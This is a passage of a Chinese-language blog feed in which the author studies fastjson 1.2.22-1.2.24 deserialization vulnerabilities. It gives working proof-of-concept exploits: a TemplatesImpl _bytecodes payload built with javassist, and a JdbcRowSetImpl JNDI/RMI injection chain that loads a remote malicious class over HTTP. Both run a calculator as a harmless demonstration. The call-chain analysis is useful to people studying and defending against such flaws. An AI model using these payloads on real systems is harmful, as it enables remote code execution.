A0ADwAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABMAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABgADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABsACAAcAAwAAAAEAAEAFAABABUAAAACABY=\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;;        JSON.parseObject(jsonstr, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocqv1b1ujj30tq0hswg9.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>@type：用于识别需要反序列化的类，这里需要识别的是templatetestlmpl，因为调用了getOutputProperties方法，实例化bytecodes进行命令执行。但是由于outputProperties和bytecodes是由private修饰，所以这里要添加Feature.SupportNonPublicField参数。</li><li>_bytecodes:继承AbstractTranslet，且有base64加密过的字节码。</li><li>_name:会对此进行判断如果为null则无法触发。</li><li>_tfactory: 和name相同</li><li>_outputProperties:触发漏洞的关键参数。</li></ul><p>我们和上一篇文章一样，先从后面的链进行分析。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocq363zocj30em04mjrk.jpg" alt=""><br>在getOutputProperties函数中，调用了newTeansformer函数，我们跟入：<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocq50xol4j30os0a1jsb.jpg" alt=""><br>跟入getTransformerImpl函数<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocqb1berjj30wp0lzacp.jpg" alt=""><br>在函数中，先判断了_name是否为null，然后调用defineTransletClasses，其中调用了defineClass,defineClass主要的功能就是将字节码转换成class。</p><pre><code class="java">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)    throws ClassFormatError&#123;    return defineClass(name, b, off, len, null);&#125;</code></pre><p>最后newInstance将恶意类进行实例化进行命令执行。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrc1po6yj30sp05ygmi.jpg" alt=""><br>下面是前面的分析，因为上一篇文章讲过的原因，这里就简单讲一下重要的地方，这里先将key和默认值进行比对，并且没有打开Feature.DisableSpecialKeyDetect,这个打开会进行关键字检测。然后通过loadclass加载templateslpml<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrhzitt1j314l05zaar.jpg" alt=""><br>getDeserializer会获取对应类的反序列化器JavaBeanDeserializer<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrw3m3glj30ji085gm4.jpg" alt=""><br>JavaBeanDeserializer会根据偏移量获取到下一个key值_bytecodes<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrxixz8ej311a05v74s.jpg" alt=""><br>然后经过parseField获取value并设置到object中，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocrxixz8ej311a05v74s.jpg" alt=""><br>在parseField中跟入<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocsl27q1tj316b034dg2.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocsliy3alj30hi03vjrk.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocslpt8xrj319703h74p.jpg" alt=""><br>可以看见这里进行了base64解码这就是为什么bytecodes进行base64加密的原因。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gocsr6gikkj30pz06l0ts.jpg" alt=""><br>我们可以看见这里说fieldinfo一件变成了outputProperties了，这是因为中smartmatch中将_替换成了空。之后会触发setoutputProperties。最后命令执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之后木爷告诉我其实不用将java转成class文件。<br>直接用javasist动态生成字节码就可以了。木爷给的代码：</p><pre><code class="java">import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.util.Base64;public class poc1 &#123;    public static String generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        String EvilCode = Base64.getEncoder().encodeToString(bytes);        System.out.println(EvilCode);        return EvilCode;    &#125;    public static void main(String[] args) throws Exception &#123;        final String GADGAT_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String evil = poc1.generateEvil();        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + GADGAT_CLASS + &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + evil + &quot;\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; + &quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;;        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);    &#125;&#125;</code></pre>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson1.2.22-1.2.24漏洞复现与分析</title>
    <link href="http://yoursite.com/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2021/03/07/fastjson1.2.22-1.2.24%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-07T03:12:01.000Z</published>
    <updated>2021-07-29T05:50:48.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于Java反序列化-初识RMI，JRMP，JNDI"><a href="#基于Java反序列化-初识RMI，JRMP，JNDI" class="headerlink" title="基于Java反序列化-初识RMI，JRMP，JNDI"></a>基于Java反序列化-初识RMI，JRMP，JNDI</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>QAQ，感觉自己啥也不会，要好好努力学习了。但是由于本人遗忘度很大，因此要记下来学习QAQ。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="RMI（Remote-Method-Invocation）"><a href="#RMI（Remote-Method-Invocation）" class="headerlink" title="RMI（Remote Method Invocation）"></a>RMI（Remote Method Invocation）</h3><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。</p><p>乱七八糟的一大串，简单来说，RMI就是一个只java远程调用方法的行为。</p><h3 id="JRMP（Java-Remote-Method-Protocol）"><a href="#JRMP（Java-Remote-Method-Protocol）" class="headerlink" title="JRMP（Java Remote Method Protocol）"></a>JRMP（Java Remote Method Protocol）</h3><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。<br>###JNDI（Java Naming and Directory Interface）<br>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><p>就是一个接口，可以通过lookup方法访问其所绑定的对象。</p><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><h5 id="程序A"><a href="#程序A" class="headerlink" title="程序A"></a>程序A</h5><p>继承Remote的HelloService接口：</p><pre><code>public interface HelloService extends Remote &#123;    String sayHello() throws RemoteException;&#125;</code></pre><p>HelloService的实现</p><pre><code>public class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;    public HelloServiceImpl() throws RemoteException &#123;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        System.out.println(&quot;hello!&quot;);        return &quot;hello!&quot;;    &#125;&#125;</code></pre><p>RMI服务端</p><pre><code>public class RMIServer &#123;    public static void main(String[] args) &#123;        try &#123;            Registry registry = LocateRegistry.createRegistry(1099);            registry.bind(&quot;hello&quot;, new HelloServiceImpl());        &#125; catch (RemoteException e) &#123;            e.printStackTrace();        &#125; catch (AlreadyBoundException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h4 id="程序B"><a href="#程序B" class="headerlink" title="程序B"></a>程序B</h4><pre><code>public class RMIClient &#123;    public static void main(String[] args) &#123;        try &#123;            HelloService helloService = (HelloService)LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099).lookup(&quot;hello&quot;);        System.out.println(helloService.sayHello());        &#125; catch (RemoteException e) &#123;            e.printStackTrace();        &#125; catch (NotBoundException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>先执行程序A再执行程序B就会打印hello。</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go8nwk0h35j324o0d8wg3.jpg" alt=""><br>程序A启动了一个RMI的注册中心，并把HelloServiceImpl暴露在注册中心中。程序B启动之后通过命名寻找方法，最后通过JRMP协议发起RMI请求，程序A输出hello后将信息序列化发送给程序B，最后程序B反序列化输出。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化有三个函数：</p><pre><code>parse (String text) parseObject(String text)parseObject(String text, Class clazz)</code></pre><pre><code class="java">import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import java.util.Properties;public class fastjsonTest &#123;    public String t1;    private int t2;    private Boolean t3;    private Properties t4;    private Properties t5;    public String getT1() &#123;        System.out.println(&quot;getT1()&quot;);        return t1;    &#125;    public void setT1(String t1) &#123;        this.t1 = t1;        System.out.println(&quot;setT1()&quot;);    &#125;    public int getT2() &#123;        System.out.println(&quot;getT2&quot;);        return t2;    &#125;    public void setT2(int t2) &#123;        System.out.println(&quot;setT2&quot;);        this.t2 = t2;    &#125;    public Boolean getT3() &#123;        System.out.println(&quot;getT3&quot;);        return t3;    &#125;    public Properties getT4() &#123;        System.out.println(&quot;getT4&quot;);        return t4;    &#125;    public Properties getT5() &#123;        System.out.println(&quot;getT5&quot;);        return t5;    &#125;    public void setT5(Properties t5) &#123;        System.out.println(&quot;setT5&quot;);        this.t5 = t5;    &#125;    @Override    public String toString() &#123;        return &quot;fastjsonTest&#123;&quot; +                &quot;t1=&#39;&quot; + t1 + &#39;\&#39;&#39; +                &quot;, t2=&quot; + t2 +                &quot;, t3=&quot; + t3 +                &quot;, t4=&quot; + t4 +                &quot;, t5=&quot; + t5 +                &#39;&#125;&#39;;    &#125;    public static void main(String[] args) &#123;        String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;fastjsonTest\&quot;,\&quot;t1\&quot;:1,\&quot;t2\&quot;:2,\&quot;t3\&quot;:3,\&quot;t4\&quot;:&#123;&#125;,\&quot;t5\&quot;:&#123;&#125;&#125;&quot;;        Object obj = JSON.parse(jsonstr);//        Object obj = JSON.parseObject(jsonstr,fastjsonTest.class);//        Object obj = JSON.parseObject(jsonstr);        System.out.println(obj);    &#125;&#125;</code></pre><h4 id="Json-parse-jsonstr"><a href="#Json-parse-jsonstr" class="headerlink" title="Json.parse(jsonstr)"></a>Json.parse(jsonstr)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xgtancaj316w0e2myz.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xlnso5cj318s08mn1g.jpg" alt=""><br>setT1() 、setT2() 、getT4() 、setT5() 被调用</p><p>JSON.parse(jsonstr)最终返回FastJsonTest类的对象</p><h4 id="JSON-parseObject-jsonstr-fastjsonTest-class"><a href="#JSON-parseObject-jsonstr-fastjsonTest-class" class="headerlink" title="JSON.parseObject(jsonstr,fastjsonTest.class)"></a>JSON.parseObject(jsonstr,fastjsonTest.class)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xs4d6ydj316c0u0te7.jpg" alt=""></p><p>可以看见parseObject(jsonstr,fastjsonTest.class)的输出和parse一样，并且obj的类也相同。</p><h4 id="JSON-parseObject-jsonstr"><a href="#JSON-parseObject-jsonstr" class="headerlink" title="JSON.parseObject(jsonstr)"></a>JSON.parseObject(jsonstr)</h4><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1go9xyxpgctj31f40u0wle.jpg" alt=""></p><p>FastJsonTest类中的所有getter与setter都被调用了，并且JSON.parseObject(jsonstr);返回一个JSONObject对象而且其中的getT4还被调用了两次，这究竟是为什么呢？</p><p>我们先来总结一下：</p><ul><li>parse(String text)，构造方法 + setter + 满足条件额外的getter</li><li>parseObject(String text, Class<T> clazz) ，构造方法 + setter + 满足条件额外的getter</li><li>JSONObject parseObject(String text)，构造方法 + setter + getter + 满足条件额外的getter</li></ul><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>分析这里讲得很清楚了，就不复述了。<a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></p><h2 id="JdbcRowsetlmpl"><a href="#JdbcRowsetlmpl" class="headerlink" title="JdbcRowsetlmpl"></a>JdbcRowsetlmpl</h2><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><p>因为过程中出现了bug，导致不能远程调用class文件，导致我学了一天才搞懂，虽然过程很自闭，但是还好最后解决了。我们先写一个JNDIserver的代码：</p><pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.NamingException;import javax.naming.Reference;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class JNDIServer &#123;    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException, RemoteException &#123;        Registry registry = LocateRegistry.createRegistry(1099);        System.out.println(&quot;Java RMI created!port:1099&quot;);        Reference reference = new Reference(&quot;exploit&quot;, &quot;badClassName&quot;,&quot;http://127.0.0.1:8000/&quot;);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind(&quot;exploit&quot;,referenceWrapper);    &#125;&#125;</code></pre><h4 id="JNDIClient"><a href="#JNDIClient" class="headerlink" title="JNDIClient"></a>JNDIClient</h4><pre><code class="java">import com.alibaba.fastjson.JSON;public class JNDIClient &#123;    public static void main(String[] args) &#123;        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;        JSON.parse(PoC);    &#125;&#125;</code></pre><h4 id="badClassName"><a href="#badClassName" class="headerlink" title="badClassName"></a>badClassName</h4><pre><code class="java">import java.io.IOException;import java.io.Serializable;import java.util.Hashtable;import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;public class badClassName implements ObjectFactory, Serializable &#123;    public badClassName() &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc.exe&quot;);        &#125; catch (IOException var2) &#123;            var2.printStackTrace();        &#125;    &#125;    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4) throws Exception &#123;        return null;    &#125;    public static void main(String[] var0) &#123;        new badClassName();    &#125;&#125;</code></pre><p>部署过程先运行JNIDServer然后再编译badClassName生成class文件，利用python启动HTTP服务，最后再启动JNDIClient便可以弹出计算器。<br>    python3 -m http.server 8000(这里不写端口号默认为8000)<br>这里如果想要成功复现的话需要如下环境：</p><ul><li>fastjson1.2.22-1.2.24</li><li>JDK&lt;=6u141、7u131、8u121.</li><li>在一些java8的版本也可以添加JVM参数-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</li></ul><p>如果运行完成功弹出计算器，记得看一下http是否被访问，只有被访问，才算成功的复现，如果没访问就弹出计算器是因为在本地加载了class文件。当时为就是一直卡在这里，由于m1的适配问题，为换了一台电脑，但是又因为为Windows的环境问题有一些小bug，不过还好最终解决了。</p><h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们先逆向的分析，这样个人认为比较容易明白。<br>我们通过对JDNI注入的学习，应该知道JNDI注入是因为lookup的调用，那我们要思考中JdbcRowsetlmpl中哪里触发了lookup函数。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4v1hzbsj31fx0qe798.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4yvzb48j316s0nxdjm.jpg" alt=""><br>在JdbcRowSetlmpl函数中调用到lookup函数的是connect函数，我们看见lookup的参数是getDataSourceName返回的函数。我们上面总结过中parse中，会调用所有的setter函数，因此datasource是可控的。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob503ywbej30kn05mt92.jpg" alt=""><br>在setAutoCommit中调用了connect。因此POC遍显而易见了</p><pre><code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://localhost:1099/exploit&quot;, &quot;autoCommit&quot;:false&#125;</code></pre><p>这里先总结一下后面的调用链：</p><pre><code>Lookup:417,InitalContext //jndi lookup函数通过rmi或者ldap获取恶意类connect：624，JdbcRowSetlmpl。//通过connect触发lookupsetAutoCommit:4067,JdbcRowSetImpl //通过setAutoCommit从而在后面触发了connect函数</code></pre><p>我们再转回去看看</p><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4pcbxrlj30kh04gq35.jpg" alt=""><br>从parse进入，刚开始会调用DefaultJSONParser，这个函数会将token设置为12.<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob4rukux4j30qk08v0tl.jpg" alt=""><br>然后我们跟进DefaultJSONParser.parser函数中，</p><p>在上面我们说过token被设置为12，因此在这里会跳转到这个位置，<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob592xkcxj30rj0bgabp.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5buoytyj30v1054jsb.jpg" alt=""><br>这里获取key值与@type做对比，然后获取class值。继续跟踪<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5dz5cyrj317l0530tf.jpg" alt=""><br>这里调用了getDeserializer生成该类型的反序列化器，但是这里利用了ASM机制动态生成类，但是此类的Java源文件没有，无法进行调试，按照之前的逻辑，在FastjsonASMDeserializer_1_JdbcRowSetImpl中会获取到属性的key值，并通过DefaultFieldDeserializer.parseField方法反序列化属性。<br>我们进入到deserialize中。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5kk9cqbj318h05pdgi.jpg" alt=""><br>这里将autoCommit作为key值传入。最后通过setValue触发invoke。<br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5q1xwa1j30g802wwed.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gob5q8g06cj30ms02oq2y.jpg" alt=""><br>后面就是后半段链了。<br>下面是利用链：</p><pre><code>parse#fastjson  paserObject#fastjson   deserialze#JavaBeanDeserializer    parseField#DefaultFieldDeserialzer      setValue#fieldDeserializer    invoke#Method      serAutoCommit#JabcRowSetlmpl       connect#JdbcRowSetlmpl             lookup</code></pre><p>还有一个利用链事LADP+RMI原理差不多，就不写了。</p><h2 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h2><pre><code>JDK低版本Factory 为类名，且Exploit有完整包名，主要保持二者不一致，否则会直接从本地加载类；</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>也不知道自己理解的有没有问题，哎，终究是太菜，觉得大佬们都好强。还是要继续努力QAQ。这个月买了想了半个年的macbookpro m1但是也发生了让我很伤心的事。</p><p>你总以为，未来路很长，有无限的可能。却不知道，有些人有些物等不了你。世间好物不坚牢，彩云易散琉璃脆。你只有见过死亡，才能体会生活的真相。</p><p>人生如逆旅，你我皆行人，擦肩而过，就是永远。</p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
</feed>
